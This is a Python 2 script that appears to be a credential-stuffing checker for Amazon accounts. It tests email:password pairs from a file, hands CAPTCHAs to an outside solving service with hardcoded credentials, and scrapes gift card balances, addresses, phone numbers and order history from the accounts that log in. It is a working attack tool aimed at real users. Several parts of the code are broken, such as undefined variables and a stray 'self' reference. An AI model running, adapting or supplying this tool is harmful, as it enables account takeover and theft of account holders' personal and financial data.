# -*- coding: utf-8 -*-
import requests
import re
import concurrent.futures
import codecs
import urllib
import os
import base64
import binascii
import json
import time
from random import choice


def Login(user, password):
    global captcha
    captcha = True
    while not captcha:
        time.sleep(0.2)
    work = True
    while work:
        proxies = {
            'https': 'http://{0}'.format('127.0.0.1:8888')
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        amazon = requests.get('https://www.amazon.com/ap/signin?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&pageId=amzn_payments&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&marketPlaceId=AZ4B0ZS3LGLX&openid.assoc_handle=amzn_payments&openid.return_to=https%3A%2F%2Fpayments.amazon.com%3A443%2Foverview&openid.pape.max_auth_age=0&openid.pape.preferred_auth_policies=http%3A%2F%2Fschemas.amazon.com%2Fpape%2Fpolicies%2F2010%2F05%2Fsingle-factor-strong&ld=APUSDefault_OLD',
                              proxies=proxies,
                              verify=False,
                              headers=headers,
                              timeout=7.5)
        apptoken = re.findall('<input type="hidden" name="appActionToken" value="(.*?)" />', amazon.text)
        openidns = re.findall('<input type="hidden" name="openid.ns" value="(.*?)" />', amazon.text)
        openididentity = re.findall('<input type="hidden" name="openid.identity" value="(.*?)" />', amazon.text)
        openidclaimed_id = re.findall('<input type="hidden" name="openid.claimed_id" value="(.*?)" />',
                                      amazon.text)
        openidmode = re.findall('<input type="hidden" name="openid.mode" value="(.*?)" />', amazon.text)
        openidassoc_handle = re.findall('<input type="hidden" name="openid.assoc_handle" value="(.*?)" />',
                                        amazon.text)
        openidreturn_to = re.findall('<input type="hidden" name="openid.return_to" value="(.*?)" />',
                                     amazon.text)
        data = {
            'appActionToken': apptoken[0],
            'appAction': 'SIGNIN',
            'openid.pape.max_auth_age': 'ape:MA==',
            'openid.ns': openidns[0],
            'pageId': 'ape:YW16bl9wYXltZW50cw==',
            'openid.identity': openididentity[0],
            'openid.claimed_id': openidclaimed_id[0],
            'openid.mode': openidmode[0],
            'prevRID': 'ape:MUZXU0FXUU5YOTRENTlCMEUzS1k=',
            'openid.assoc_handle': openidassoc_handle[0],
            'openid.return_to': openidreturn_to[0],
            'openid.pape.preferred_auth_policies': 'ape:aHR0cDovL3NjaGVtYXMuYW1hem9uLmNvbS9wYXBlL3BvbGljaWVzLzIwMTAvMDUvc2luZ2xlLWZhY3Rvci1zdHJvbmc=',
            'marketPlaceId': 'ape:QVo0QjBaUzNMR0xY',
            'email': user,
            'password': password
        }
        payload = urllib.urlencode(data)
        headers1 = dict()
        headers1['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0'
        headers1['Content-Type'] = 'application/x-www-form-urlencoded'
        headers1['Referer'] = amazon.url
        amazon.cookies['session-id-time'] = '2082787201l'
        response = requests.post("https://www.amazon.com/ap/signin", payload, proxies=proxies,
                                 verify=False, headers=headers1, timeout=7.5, cookies=amazon.cookies,
                                 allow_redirects=True)
        if 'Type the characters you see in this image.' in response.text:
            print 'Captcha'
            captcha = True
            while captcha:
                captchaurl = re.findall('<div id="ap_captcha_img">\n    <img src="(.*?)" />', response.text)
                if captchaurl[0].find('data:image') != -1:
                    captchafile = captchaurl[0].replace('data:image/jpeg;base64,', 'base64:')
                elif captchaurl[0].find('https://') != -1:
                    captchafile = requests.get(captchaurl[0], verify=False).content
                else:
                    captchafile = None
                boundry = binascii.hexlify(os.urandom(8))
                headersc = dict()
                headersc['User-Agent'] = 'DBC/Python v4.1.2'
                headersc['Content-Type'] = 'multipart/form-data; boundary=----WebKitFormBoundary{0}'.format(boundry)
                headersc['Accept'] = 'application/json'
                headersc['Expect'] = 'username=woxxy&password=playtime2'
                captchaupload = requests.post(
                    'http://api.dbcapi.me/api/captcha',
                    '------WebKitFormBoundary{0}\r\nContent-Disposition: form-data; name="username"\r\n\r\nwoxxy\r\n------WebKitFormBoundary{0}\r\n'
                    'Content-Disposition: form-data; name="password"\r\n\r\nplaytime2\r\n------WebKitFormBoundary{0}\r\nContent-D'
                    'isposition: form-data; name="captchafile"; filename="captcha"\r\nContent-Type: image/jpeg\r\n\r\nbase64:{1}\r\n'
                    '------WebKitFormBoundary{0}--'.format(boundry, base64.b64encode(captchafile)),
                    headers=headersc,
                    verify=False
                )
                captchatest = json.loads(captchaupload.text)
                if captchatest['status'] != 0:
                    work = True
                    break
                jsonstuff = dict()
                jsonstuff['text'] = ''
                while jsonstuff['text'] == '':
                    captcharesponses = requests.get('http://api.dbcapi.me/api/captcha/{0}'.format(captchatest['captcha']), headers={'Accept': 'application/json'})
                    jsonstuff = json.loads(captcharesponses.text)
                    time.sleep(1)
                apptoken = re.findall('<input type="hidden" name="appActionToken" value="(.*?)" />', response.text)
                openidns = re.findall('<input type="hidden" name="openid.ns" value="(.*?)" />', response.text)
                openididentity = re.findall('<input type="hidden" name="openid.identity" value="(.*?)" />', response.text)
                openidclaimed_id = re.findall('<input type="hidden" name="openid.claimed_id" value="(.*?)" />',
                                              response.text)
                ces = re.findall('<input type="hidden" name="ces" value="(.*?)" />', response.text)
                openidmode = re.findall('<input type="hidden" name="openid.mode" value="(.*?)" />', response.text)
                openidassoc_handle = re.findall('<input type="hidden" name="openid.assoc_handle" value="(.*?)" />',
                                                response.text)
                openidreturn_to = re.findall('<input type="hidden" name="openid.return_to" value="(.*?)" />',
                                             response.text)
                data = {
                    'appActionToken': apptoken[0],
                    'appAction': 'SIGNIN',
                    'openid.pape.max_auth_age': 'ape:MA==',
                    'openid.ns': openidns[0],
                    'pageId': 'ape:YW16bl9wYXltZW50cw==',
                    'openid.identity': openididentity[0],
                    'openid.claimed_id': openidclaimed_id[0],
                    'openid.mode': openidmode[0],
                    'ces': ces[0],
                    'openid.assoc_handle': openidassoc_handle[0],
                    'openid.return_to': openidreturn_to[0],
                    'openid.pape.preferred_auth_policies': 'ape:aHR0cDovL3NjaGVtYXMuYW1hem9uLmNvbS9wYXBlL3BvbGljaWVzLzIwMTAvMDUvc2luZ2xlLWZhY3Rvci1zdHJvbmc=',
                    'create': '0',
                    'forceValidateCaptcha': 'ape:dHJ1ZQ==',
                    'marketPlaceId': 'ape:QVo0QjBaUzNMR0xY',
                    'email': user,
                    'password': password,
                    'guess': jsonstuff['text'].upper()
                }
                payload = urllib.urlencode(data)
                headers1 = dict()
                headers1['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0'
                headers1['Content-Type'] = 'application/x-www-form-urlencoded'
                headers1['Referer'] = response.url
                amazon.cookies['session-id-time'] = '2082787201l'
                response1 = requests.post("https://www.amazon.com/ap/signin", payload, proxies=proxies,
                                          verify=False, headers=headers1, timeout=7.5, cookies=amazon.cookies,
                                          allow_redirects=True)
                if not 302 in response.status_code:
                    print user, password, 'doesn\'t work!'
                    work = False
                    captcha = False
                elif 'To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.' in response1.text:
                    captcha = True
                else:
                    print 'captcha'
                    print user, password, 'worked! Gathering info!'
                    r = requests.get('https://www.amazon.com/gp/aw/ya/gcb/ref=aa_ya_m_gcb', proxies=proxies,
                                     verify=False, headers=headers, cookies=response.history[0].cookies, timeout=7.5)
                    ree = re.compile('002B">\n \$(.*?)\n', re.DOTALL)
                    gcb = ree.search(r.text).groups()[0].replace('\n', '')
                    r1 = requests.get('https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8&ref_=ya_manage_a'
                                      'ddress_book&',
                                      proxies=proxies, verify=False, headers=headers,
                                      cookies=response.history[0].cookies, timeout=7.5)
                    r1ree1 = re.compile(u'<li class="displayAddressLI displayAddressCityStateOrRegionPostalCode">(.*?)'
                                        u'</li>')
                    zipcity = r1ree1.findall(r1.text)
                    r1ree2 = re.compile(u'<li class="displayAddressLI displayAddressPhoneNumber">Phone: (.*?)</li>')
                    phonenum = r1ree2.findall(r1.text)
                    order = list()
                    year = int(self.spinbox1.get())
                    years = int(self.spinbox2.get())
                    headers2 = dict()
                    headers2['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox' \
                                             '/30.0'
                    headers2['Content-Type'] = 'application/x-www-form-urlencoded'
                    headers2['Referer'] = 'https://www.amazon.com/gp/aw/ya/ref=aw_oh_ch'
                    while year <= years:
                        page = 0
                        pages = 5
                        while page <= pages:
                            r2 = requests.get('https://www.amazon.com/gp/css/order-history/ref=oh_aui_pagination_1_2?orderFilter=year-{0}&startIndex={1}'.format(year, page * 10),
                                              proxies=proxies,
                                              verify=False,
                                              headers=headers2,
                                              cookies=r1.cookies,
                                              timeout=7.5)
                            r2ree = re.compile('href="/gp/css/summary/edit.html/(.*?)">')
                            r2reg = r2ree.match(r2.text)
                            r2reg = [item.strip() for item in r2reg.groups()]
                            for ods in r2reg:
                                orderget = requests.get('https://www.amazon.com/gp/css/summary/edit.html/{0}'.format(ods),
                                                        proxies=proxies,
                                                        verify=False,
                                                        headers=headers2,
                                                        cookies=r2.cookies,
                                                        timeout=7.5)
                                orderstatus = re.compile('<span class="info-title">Delivered On</span>(.*?)&nbsp;').match(orderget.text)
                                orderdatenumbertotal = re.compile('<tr><td valign="top" align="left">.*?Order Placed:.*? (.*?)</td>.*?<b>Amazon.com order number:.*?</b>(.*?) </td>.*?<tr><td valign="top" align="left">.*?Order Total:.*? (.*?)</b>.*?</td></tr>').match(orderget.text)
                                ordersreal = re.compile('<a href="http://www.amazon.com/gp/product/.*?">(.*?)</a>.*?<span class=\'tiny\'>.*?Sold by: (.*?) .*?<br />').match(orderget.text)
                                order.append([orderstatus.decode('utf-8', 'ignore'), orderdatenumbertotal.decode('utf-8', 'ignore'), ordersreal.decode('utf-8', 'ignore')])
                            page += 1
                        year += 1
                    # with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
                    #     myfile.write("\n===========================================================================\n"
                    #                  "Username: {0}\n"
                    #                  "Password: {1}\n"
                    #                  "Available Giftcard Balance: {2}\n".format(user, password, gcb))
                    # zipcity = [item.strip() for item in zipcity]
                    # if zipcity is not None:
                    #     for zip in zipcity:
                    #         with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
                    #             myfile.write("Zip Code: {0}\n".format(zip.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
                    # phonenum = [item.strip() for item in phonenum]
                    # if phonenum is not None:
                    #     for phone in phonenum:
                    #         with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
                    #             myfile.write("Phone Number: {0}\n".format(phone.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
                    # with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
                    #     myfile.write("Orders:\n")
                    # orders = [item.strip() for item in order]
                    if orders is not None:
                        print orders
                        for oder in orders:
                            print oder
                            # with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
                            #     myfile.write("    {0}\n".format(oder.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
                    else:
                        print user, password, 'had no orders!'
                        os.remove("./accounts/{0}.txt".format(user))
                    work = False
                time.sleep(1)
        elif "There was an error with your E-Mail/Password combination. Please try again" in response.text:
            print user, password, 'doesn\'t work!'
            work = False
        elif 'Sign In' in response.text:
            print user, password, 'doesn\'t work!'
            work = False
        else:
            print 'not captcha'
            print user, password, 'worked! Gathering info!'
            r = requests.get('https://www.amazon.com/gp/aw/ya/gcb/ref=aa_ya_m_gcb', proxies=proxies,
                             verify=False, headers=headers, cookies=response.history[0].cookies, timeout=7.5)
            ree = re.compile('<font color="#99002B">. \$(.*?).</font>', re.DOTALL)
            gcb = ree.search(r.text).groups()[0].replace('\n', '')
            print gcb
            r1 = requests.get('https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8&ref_=ya_manage_a'
                              'ddress_book',
                              proxies=proxies, verify=False, headers=headers,
                              cookies=response.history[0].cookies, timeout=7.5)
            r1ree = re.compile('displayAddressLI displayAddressAddressLine1">(.*?)</li>')
            address = r1ree.findall(r1.text)
            r1ree1 = re.compile('<li class="displayAddressLI displayAddressCityStateOrRegionPostalCode">(.*?)</li>')
            zipcity = r1ree1.findall(r1.text)
            r1ree2 = re.compile('<li class="displayAddressLI displayAddressPhoneNumber">Phone: (.*?)</li>')
            phonenum = r1ree2.findall(r1.text)
            order = list()
            year = int(globyear)
            years = int(globyears)
            headers2 = dict()
            headers2['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox' \
                                     '/30.0'
            headers2['Referer'] = 'https://www.amazon.com/gp/aw/ya/ref=aw_oh_ch'
            while year <= years:
                page = 0
                pages = 5
                while page <= pages:
                    r2 = requests.get('https://www.amazon.com/gp/css/order-history/ref=oh_aui_pagination_1_2?orderFilter=year-{0}&startIndex={1}'.format(year, page * 10),
                                      proxies=proxies,
                                      verify=False,
                                      headers=headers2,
                                      cookies=response.history[0].cookies,
                                      timeout=7.5)
                    r2ree = re.compile('href="/gp/css/summary/edit.html/(.*?)">')
                    r2reg = r2ree.match(r2.text)
                    r2reg = [item.strip() for item in r2reg.groups()]
                    for ods in r2reg:
                        orderget = requests.get('https://www.amazon.com/gp/css/summary/edit.html/{0}'.format(ods),
                                                proxies=proxies,
                                                verify=False,
                                                headers=headers2,
                                                cookies=response.history[0].cookies,
                                                timeout=7.5)
                        orderstatus = re.compile('<span class="info-title">Delivered On</span>(.*?)&nbsp;').match(orderget.text)
                        orderdatenumbertotal = re.compile('<tr><td valign="top" align="left">.*?Order Placed:.*? (.*?)</td>.*?<b>Amazon.com order number:.*?</b>(.*?) </td>.*?<tr><td valign="top" align="left">.*?Order Total:.*? (.*?)</b>.*?</td></tr>').match(orderget.text)
                        ordersreal = re.compile('<a href="http://www.amazon.com/gp/product/.*?">(.*?)</a>.*?<span class=\'tiny\'>.*?Sold by: (.*?) .*?<br />').match(orderget.text)
                        order.append([orderstatus.decode('utf-8', 'ignore'), orderdatenumbertotal.decode('utf-8', 'ignore'), ordersreal.decode('utf-8', 'ignore')])
                    page += 1
                year += 1
            # with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
            #     myfile.write("\n===========================================================================\n"
            #                  "Username: {0}\n"
            #                  "Password: {1}\n"
            #                  "Available Giftcard Balance: {2}\n".format(user, password, gcb))
            # zipcity = [item.strip() for item in zipcity]
            # if zipcity is not None:
            #     for zip in zipcity:
            #         with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
            #             myfile.write("Zip Code: {0}\n".format(zip.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
            # phonenum = [item.strip() for item in phonenum]
            # if phonenum is not None:
            #     for phone in phonenum:
            #         with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
            #             myfile.write("Phone Number: {0}\n".format(phone.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
            # with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
            #     myfile.write("Orders:\n")
            orders = [item.strip() for item in order]
            if orders is not None:
                print orders
                for oder in orders:
                    print oder
                    # with codecs.open("./accounts/{0}.txt".format(user), "a", encoding="utf-8") as myfile:
                    #     myfile.write("    {0}\n".format(oder.decode('unicode_escape', 'ignore').encode("ascii", "ignore")))
            else:
                print user, password, 'had no orders!'
                os.remove("./accounts/{0}.txt".format(user))
            work = False


def main():
    global globyear
    global globyears
    globyear = 2015
    globyears = 2016
    with codecs.open('login.txt', 'r') as f:
        global userpass
        userpass = f.readlines()
    proxy = False
    if proxy:
        with codecs.open('proxies.txt', 'r', encoding="utf-8") as f:
            global proxies
            proxies = f.readlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as x:
        for userpasscombo in userpass:
            upass = userpasscombo.split(':')
            if proxy:
                x.submit(Login, upass[0].strip(), upass[1].strip(), proxies)
            else:
                x.submit(Login, upass[0].strip(), upass[1].strip())

if __name__ == '__main__':
    main()
